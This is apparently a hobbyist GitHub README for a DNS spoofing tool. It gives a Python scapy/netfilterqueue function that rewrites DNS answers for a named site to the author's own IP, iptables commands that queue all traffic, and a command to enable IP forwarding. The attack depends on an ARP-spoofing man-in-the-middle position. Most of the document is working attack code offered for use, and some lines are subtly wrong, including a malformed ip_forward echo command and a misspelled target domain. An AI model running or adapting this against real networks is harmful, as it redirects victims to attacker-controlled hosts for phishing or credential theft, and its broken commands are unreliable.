# DNS_spoof

##Used Modules

###netfilterqueue

This modules is used to redirect the flow of packets, the funtions process_packet will receive the packet and turn it into a scapy packet that i can edit(if you wanna know more about the module scapy go to another of my repositories like ARP_spoof).
When i verify that i have some request from my target(i can know if i have one request because i became the MITM, go to my repository ARP_spoof) if that's true i'm gonna take the value of the url and see if is the same web-site that i wanna spoof, and if it is i can send the DNS response with my ip destination, but with the same url name. Finally i can change the field "an" that contain the real answer to my costumized response and change the field "ancount" for just one response. Finally i'm gonna turn the scapy packet to a real packet.

```python
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
         if "testephp.vulnweb.com" in qname:
             print("[+] Spoofing target" + str(qname))
             answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.8")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
          
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.UDP].chksum
             del scapy_packet[scapy.UDP].len
            

             packet.set_payload(str(scapy_packet))
```


## Used Commands

these commands clean the Iptables, and redirect the packets entering and leaving my pc for a queue 0 that i'm creating, this way all the packets that came through my computer instead of just pass (because of my arp_spoof when i became the Man-in-the-Midle) i'm gonna store all the packets in a queue.  

iptables --flush<br>
iptables -I INPUT -j NFQUEUE --queue-num  0<br>
iptables -I OUTPUT -j NFQUEUE --queue-num  0<br>

Internet sharing on Linux is done through Netfilter / Iptables, which is the native firewall for distributions starting with the 2.4 kernel. So is necessary to use this command, this command writes the number 1 into the ip_forward file, enabling packet routing. The default is 0. With this, Linux starts to route packages from one interface to the other and vice versa(My target and my host).

echo > 1 /proc/sys/ipv4/ip_forward


